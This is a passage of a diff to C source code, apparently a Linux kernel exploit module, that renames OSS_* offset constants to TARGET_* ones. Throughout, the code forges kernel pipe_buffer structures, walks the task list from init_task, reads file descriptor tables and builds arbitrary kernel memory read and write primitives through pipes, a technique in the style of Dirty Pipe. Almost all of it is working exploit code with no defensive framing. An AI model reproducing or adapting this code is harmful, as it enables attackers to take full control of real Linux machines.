                               size_t len) {
   if (!g_victim_addr || g_victim_pipe < 0 || !g_victim_saved_valid ||
       !is_direct_ptr(addr) || !len ||
-      (addr & OSS_PAGE_MASK) + len > OSS_PAGE_SIZE) {
+      (addr & TARGET_PAGE_MASK) + len > TARGET_PAGE_SIZE) {
     errno = ENODATA;
     return 0;
   }
@@ -1426,10 +1362,10 @@ static int pipe_rw_write_once(int fd, uint64_t addr, const void *buf,
   }
   struct oss_pipe_buffer forged = saved;
   forged.page = direct_to_page(addr);
-  forged.offset = (uint32_t)(addr & OSS_PAGE_MASK);
+  forged.offset = (uint32_t)(addr & TARGET_PAGE_MASK);
   forged.len = 0;
-  forged.ops = g_kernel_base + OSS_ANON_PIPE_BUF_OPS_OFF;
-  forged.flags = OSS_PIPE_CAN_MERGE;
+  forged.ops = g_kernel_base + TARGET_ANON_PIPE_BUF_OPS_OFF;
+  forged.flags = TARGET_PIPE_CAN_MERGE;
   forged.private = 0;
   if (!oss_kernel_write(fd, g_victim_addr, &forged, sizeof(forged))) {
     int restored = oss_kernel_write(fd, g_victim_addr, &saved, sizeof(saved));
@@ -1449,7 +1385,7 @@ static int pipe_rw_write_once(int fd, uint64_t addr, const void *buf,
 }
 
 static int prove_pipe_rw(int fd, enum pipe_error *error) {
-  uint64_t proof_addr = g_payload_base + OSS_PROOF_OFF;
+  uint64_t proof_addr = g_payload_base + TARGET_PIPE_PROOF_LIVE_OFF;
   static const char read_string[] = OSS_PROOF_READ_TAG;
   static const char write_string[] = OSS_PROOF_WRITE_TAG;
   char string_readback[sizeof(read_string)];
@@ -1546,7 +1482,7 @@ static int establish_pipe_rw(int fd, enum pipe_error *error) {
     *error = PIPE_E_PREPARE;
     return 0;
   }
-  uint64_t slabs[OSS_PIPE_MAX_SLABS];
+  uint64_t slabs[TARGET_PIPE_MAX_SLABS];
   size_t slab_count = 0;
   if (!collect_pipe_slabs(fd, slabs, &slab_count)) {
     *error = PIPE_E_CACHE_SELECT;
@@ -1575,7 +1511,7 @@ static int establish_pipe_rw(int fd, enum pipe_error *error) {
  * region covers the complete slot. Restore and verify after every read. */
 static uint64_t walk_find_task(int fd, pid_t want_pid,
                                enum pipe_error *error) {
-  uint64_t list_head = g_kernel_base + OSS_INIT_TASK_OFF + OSS_TASK_TASKS_OFF;
+  uint64_t list_head = g_kernel_base + TARGET_INIT_TASK_OFF + TARGET_TASK_TASKS_OFF;
   fprintf(stderr, "[pipe_rw] det: task walk head=%016llx pid=%d\n",
           (unsigned long long)list_head, want_pid);
   uint64_t node = oss_kernel_read64(fd, list_head + sizeof(uint64_t));
@@ -1588,13 +1524,13 @@ static uint64_t walk_find_task(int fd, pid_t want_pid,
       stop = node == list_head ? "list-head" : "invalid-node";
       break;
     }
-    uint64_t task = node - OSS_TASK_TASKS_OFF;
+    uint64_t task = node - TARGET_TASK_TASKS_OFF;
     if (!is_direct_ptr(task)) {
       stop = "non-direct-task";
       break;
     }
     struct slab_cache_guard guard;
-    if (!slab_cache_guard_begin(fd, task, OSS_TASK_CACHE_SIZE, &guard)) {
+    if (!slab_cache_guard_begin(fd, task, TARGET_TASK_CACHE_SIZE, &guard)) {
       if (atomic_load_explicit(&g_io_restore_failed, memory_order_acquire)) {
         *error = PIPE_E_RESTORE;
       }
@@ -1604,9 +1540,9 @@ static uint64_t walk_find_task(int fd, pid_t want_pid,
     uint32_t pid = 0;
     uint64_t next = 0;
     int read_ok =
-        oss_kernel_read(fd, task + OSS_TASK_PID_OFF, &pid, sizeof(pid)) &&
+        oss_kernel_read(fd, task + TARGET_TASK_PID_OFF, &pid, sizeof(pid)) &&
         oss_kernel_read(fd,
-                        task + OSS_TASK_TASKS_OFF + sizeof(uint64_t), &next,
+                        task + TARGET_TASK_TASKS_OFF + sizeof(uint64_t), &next,
                         sizeof(next));
     if (!slab_cache_guard_end(fd, &guard)) {
       *error = PIPE_E_RESTORE;
@@ -1639,10 +1575,10 @@ static uint64_t walk_find_task(int fd, pid_t want_pid,
 }
 
 static int read_pipe_file_table(int fd, uint64_t task,
-                                uint64_t files_out[OSS_PIPE_COUNT],
+                                uint64_t files_out[TARGET_PIPE_COUNT],
                                 enum pipe_error *error) {
   struct slab_cache_guard task_guard;
-  if (!slab_cache_guard_begin(fd, task, OSS_TASK_CACHE_SIZE, &task_guard)) {
+  if (!slab_cache_guard_begin(fd, task, TARGET_TASK_CACHE_SIZE, &task_guard)) {
     if (atomic_load_explicit(&g_io_restore_failed, memory_order_acquire)) {
       *error = PIPE_E_RESTORE;
     }
@@ -1650,7 +1586,7 @@ static int read_pipe_file_table(int fd, uint64_t task,
   }
   uint64_t files = 0;
   int task_read =
-      oss_kernel_read(fd, task + OSS_TASK_FILES_OFF, &files, sizeof(files));
+      oss_kernel_read(fd, task + TARGET_TASK_FILES_OFF, &files, sizeof(files));
   if (!slab_cache_guard_end(fd, &task_guard)) {
     *error = PIPE_E_RESTORE;
     return 0;
@@ -1660,7 +1596,7 @@ static int read_pipe_file_table(int fd, uint64_t task,
   }
 
   struct slab_cache_guard files_guard;
-  if (!slab_cache_guard_begin(fd, files, OSS_FILES_CACHE_SIZE, &files_guard)) {
+  if (!slab_cache_guard_begin(fd, files, TARGET_FILES_CACHE_SIZE, &files_guard)) {
     if (atomic_load_explicit(&g_io_restore_failed, memory_order_acquire)) {
       *error = PIPE_E_RESTORE;
     }
@@ -1669,13 +1605,13 @@ static int read_pipe_file_table(int fd, uint64_t task,
   uint64_t fdt = 0;
   uint64_t fd_array = 0;
   int table_ok =
-      oss_kernel_read(fd, files + OSS_FILES_FDT_OFF, &fdt, sizeof(fdt)) &&
+      oss_kernel_read(fd, files + TARGET_FILES_FDT_OFF, &fdt, sizeof(fdt)) &&
       is_direct_ptr(fdt) &&
-      oss_kernel_read(fd, fdt + OSS_FDTABLE_FD_OFF, &fd_array,
+      oss_kernel_read(fd, fdt + TARGET_FDTABLE_FD_OFF, &fd_array,
                       sizeof(fd_array)) &&
       is_direct_ptr(fd_array);
   if (table_ok) {
-    for (size_t i = 0; i < OSS_PIPE_COUNT; i++) {
+    for (size_t i = 0; i < TARGET_PIPE_COUNT; i++) {
       int pipe_fd = g_reclaim_pipes[i][0];
       if (pipe_fd < 0 ||
           !oss_kernel_read(fd, fd_array + (uint64_t)pipe_fd * 8,
@@ -1700,20 +1636,20 @@ static int resolve_pipe_victim_deterministic(int fd,
     fprintf(stderr, "[pipe_rw] det: task pid=%d not found in task list\n", mypid);
     return 0;
   }
-  uint64_t pipe_files[OSS_PIPE_COUNT] = {0};
+  uint64_t pipe_files[TARGET_PIPE_COUNT] = {0};
   if (!read_pipe_file_table(fd, task, pipe_files, error)) {
     fprintf(stderr, "[pipe_rw] det: fd table walk failed task=%016llx\n",
             (unsigned long long)task);
     return 0;
   }
-  uint64_t anon_ops = g_kernel_base + OSS_ANON_PIPE_BUF_OPS_OFF;
-  for (size_t i = 0; i < OSS_PIPE_COUNT; i++) {
+  uint64_t anon_ops = g_kernel_base + TARGET_ANON_PIPE_BUF_OPS_OFF;
+  for (size_t i = 0; i < TARGET_PIPE_COUNT; i++) {
     uint64_t file = pipe_files[i];
     if (!is_direct_ptr(file)) {
       continue;
     }
     struct slab_cache_guard file_guard;
-    if (!slab_cache_guard_begin(fd, file, OSS_FILE_CACHE_SIZE, &file_guard)) {
+    if (!slab_cache_guard_begin(fd, file, TARGET_FILE_CACHE_SIZE, &file_guard)) {
       if (atomic_load_explicit(&g_io_restore_failed, memory_order_acquire)) {
         *error = PIPE_E_RESTORE;
         return 0;
@@ -1721,7 +1657,7 @@ static int resolve_pipe_victim_deterministic(int fd,
       continue;
     }
     uint64_t pinfo = 0;
-    int file_read = oss_kernel_read(fd, file + OSS_FILE_PRIVATE_DATA_OFF,
+    int file_read = oss_kernel_read(fd, file + TARGET_FILE_PRIVATE_DATA_OFF,
                                     &pinfo, sizeof(pinfo));
     if (!slab_cache_guard_end(fd, &file_guard)) {
       *error = PIPE_E_RESTORE;
@@ -1734,18 +1670,18 @@ static int resolve_pipe_victim_deterministic(int fd,
       continue;
     }
     uint32_t tail = 0, ring = 0;
-    if (!oss_kernel_read(fd, pinfo + OSS_PIPE_TAIL_OFF, &tail, sizeof(tail)) ||
-        !oss_kernel_read(fd, pinfo + OSS_PIPE_RING_SIZE_OFF, &ring,
+    if (!oss_kernel_read(fd, pinfo + TARGET_PIPE_TAIL_OFF, &tail, sizeof(tail)) ||
+        !oss_kernel_read(fd, pinfo + TARGET_PIPE_RING_SIZE_OFF, &ring,
                          sizeof(ring)) ||
         ring == 0 || (ring & (ring - 1)) != 0) {
       continue;
     }
-    uint64_t bufs = oss_kernel_read64(fd, pinfo + OSS_PIPE_BUFS_OFF);
+    uint64_t bufs = oss_kernel_read64(fd, pinfo + TARGET_PIPE_BUFS_OFF);
     if (!is_direct_ptr(bufs)) {
       continue;
     }
     uint64_t victim =
-        bufs + (uint64_t)(tail & (ring - 1)) * OSS_PIPE_BUF_STRIDE;
+        bufs + (uint64_t)(tail & (ring - 1)) * TARGET_PIPE_BUFFER_STRIDE;
     struct oss_pipe_buffer candidate;
     if (!oss_kernel_read(fd, victim, &candidate, sizeof(candidate))) {
       continue;
@@ -1761,7 +1697,7 @@ static int resolve_pipe_victim_deterministic(int fd,
               i, (unsigned long long)victim, errno);
       continue;
     }
-    uint64_t slab_base = victim & ~(OSS_ORDER3_SIZE - 1);
+    uint64_t slab_base = victim & ~(TARGET_ORDER3_SIZE - 1);
     if (!is_direct_ptr(slab_base)) {
       continue;
     }
@@ -1794,8 +1730,8 @@ int oss_pipe_rw_service_pending(void) {
   }
   int timeout_ms = atomic_load_explicit(&g_prepare_timeout_ms,
                                         memory_order_acquire);
-  if (timeout_ms <= 0 || timeout_ms > OSS_PIPE_PREPARE_TIMEOUT_MS) {
-    timeout_ms = OSS_PIPE_PREPARE_TIMEOUT_MS;
+  if (timeout_ms <= 0 || timeout_ms > TARGET_PIPE_PREPARE_TIMEOUT_MS) {
+    timeout_ms = TARGET_PIPE_PREPARE_TIMEOUT_MS;
   }
   g_pipe_page_base = prepare_pipe_page(timeout_ms, &g_prepare_diag);
   int ok = g_pipe_page_base != 0;
@@ -1834,11 +1770,11 @@ int oss_pipe_rw_install(int fd, uint64_t kernel_base, uint64_t payload_base) {
     return 1;
   }
   uint64_t install_started_ms = monotonic_ms();
-  uint64_t install_deadline_ms = install_started_ms + OSS_PIPE_INSTALL_TIMEOUT_MS;
+  uint64_t install_deadline_ms = install_started_ms + TARGET_PIPE_INSTALL_TIMEOUT_MS;
   int deterministic =
       (int)pipe_env_long_clamped("PIPE_DETERMINISTIC", 1, 0, 1);
   atomic_store_explicit(&g_io_restore_failed, 0, memory_order_release);
-  for (int attempt = 1; attempt <= OSS_PIPE_ATTEMPTS; attempt++) {
+  for (int attempt = 1; attempt <= TARGET_PIPE_ATTEMPTS; attempt++) {
     int remaining_ms = deadline_remaining_ms(install_deadline_ms);
     if (remaining_ms <= 0) {
       fprintf(stderr,
@@ -1854,9 +1790,9 @@ int oss_pipe_rw_install(int fd, uint64_t kernel_base, uint64_t payload_base) {
       enum pipe_error error = PIPE_E_PREPARE;
       uint64_t det_started_ms = monotonic_ms();
       fprintf(stderr, "[pipe_rw] det: preparing pipes attempt=%d/%d\n",
-              attempt, OSS_PIPE_ATTEMPTS);
+              attempt, TARGET_PIPE_ATTEMPTS);
       int pipes_ready = create_pipe_bank(g_reclaim_pipes) &&
-                        resize_pipe_bank(g_reclaim_pipes, OSS_PIPE_SLOTS) &&
+                        resize_pipe_bank(g_reclaim_pipes, TARGET_PIPE_SLOTS) &&
                         populate_pipe_markers();
       if (pipes_ready) {
         fprintf(stderr, "[pipe_rw] det: resolving victim\n");
@@ -1867,7 +1803,7 @@ int oss_pipe_rw_install(int fd, uint64_t kernel_base, uint64_t payload_base) {
         fprintf(stderr,
                 "[pipe_rw] ready attempt=%d/%d page=%016llx victim=%016llx "
                 "pipe=%d prepare_ms=%llu establish_ms=0 total_ms=%llu det=1\n",
-                attempt, OSS_PIPE_ATTEMPTS,
+                attempt, TARGET_PIPE_ATTEMPTS,
                 (unsigned long long)g_pipe_page_base,
                 (unsigned long long)g_victim_addr, g_victim_pipe,
                 (unsigned long long)(monotonic_ms() - det_started_ms),
@@ -1877,19 +1813,19 @@ int oss_pipe_rw_install(int fd, uint64_t kernel_base, uint64_t payload_base) {
       if (error == PIPE_E_RESTORE) {
         fprintf(stderr,
                 "[pipe_rw] det terminal failure attempt=%d/%d reason=restore\n",
-                attempt, OSS_PIPE_ATTEMPTS);
+                attempt, TARGET_PIPE_ATTEMPTS);
         return 0;
       }
       oss_pipe_rw_reset();
       fprintf(stderr,
               "[pipe_rw] det miss attempt=%d/%d reason=%s; fallback=legacy\n",
-              attempt, OSS_PIPE_ATTEMPTS, pipe_error_name(error));
+              attempt, TARGET_PIPE_ATTEMPTS, pipe_error_name(error));
       g_kernel_base = kernel_base;
       g_payload_base = payload_base;
     }
     int prepare_timeout_ms = remaining_ms;
-    if (prepare_timeout_ms > OSS_PIPE_PREPARE_TIMEOUT_MS) {
-      prepare_timeout_ms = OSS_PIPE_PREPARE_TIMEOUT_MS;
+    if (prepare_timeout_ms > TARGET_PIPE_PREPARE_TIMEOUT_MS) {
+      prepare_timeout_ms = TARGET_PIPE_PREPARE_TIMEOUT_MS;
     }
     atomic_store_explicit(&g_prepare_timeout_ms, prepare_timeout_ms,
                           memory_order_release);
@@ -1913,7 +1849,7 @@ int oss_pipe_rw_install(int fd, uint64_t kernel_base, uint64_t payload_base) {
       fprintf(stderr,
               "[pipe_rw] ready attempt=%d/%d page=%016llx victim=%016llx "
               "pipe=%d prepare_ms=%llu establish_ms=%llu total_ms=%llu\n",
-              attempt, OSS_PIPE_ATTEMPTS,
+              attempt, TARGET_PIPE_ATTEMPTS,
               (unsigned long long)g_pipe_page_base,
               (unsigned long long)g_victim_addr, g_victim_pipe,
               (unsigned long long)diag.elapsed_ms,
@@ -1933,7 +1869,7 @@ int oss_pipe_rw_install(int fd, uint64_t kernel_base, uint64_t payload_base) {
       fprintf(stderr,
               "[pipe_rw] terminal failure attempt=%d/%d reason=%s stage=%s "
               "errno=%d elapsed_ms=%llu; preserving pipes\n",
-              attempt, OSS_PIPE_ATTEMPTS, pipe_error_name(error),
+              attempt, TARGET_PIPE_ATTEMPTS, pipe_error_name(error),
               pipe_stage_name(failed_stage), failed_errno,
               (unsigned long long)attempt_ms);
       return 0;
@@ -1942,7 +1878,7 @@ int oss_pipe_rw_install(int fd, uint64_t kernel_base, uint64_t payload_base) {
     fprintf(stderr,
             "[pipe_rw] setup miss attempt=%d/%d reason=%s stage=%s detail=%s errno=%d "
             "elapsed_ms=%llu\n",
-            attempt, OSS_PIPE_ATTEMPTS, pipe_error_name(error),
+            attempt, TARGET_PIPE_ATTEMPTS, pipe_error_name(error),
             pipe_stage_name(failed_stage),
             pipe_collision_failure_name(collision_failure), failed_errno,
             (unsigned long long)attempt_ms);
@@ -1964,7 +1900,7 @@ int oss_pipe_rw_read(int fd, uint64_t addr, void *buf, size_t len) {
   }
   unsigned char *cursor = buf;
   while (len) {
-    size_t chunk = OSS_PAGE_SIZE - (size_t)(addr & OSS_PAGE_MASK);
+    size_t chunk = TARGET_PAGE_SIZE - (size_t)(addr & TARGET_PAGE_MASK);
     if (chunk > len) {
       chunk = len;
     }
@@ -1984,7 +1920,7 @@ int oss_pipe_rw_write(int fd, uint64_t addr, const void *buf, size_t len) {
   }
   const unsigned char *cursor = buf;
   while (len) {
-    size_t chunk = OSS_PAGE_SIZE - (size_t)(addr & OSS_PAGE_MASK);
+    size_t chunk = TARGET_PAGE_SIZE - (size_t)(addr & TARGET_PAGE_MASK);
     if (chunk > len) {
       chunk = len;
     }
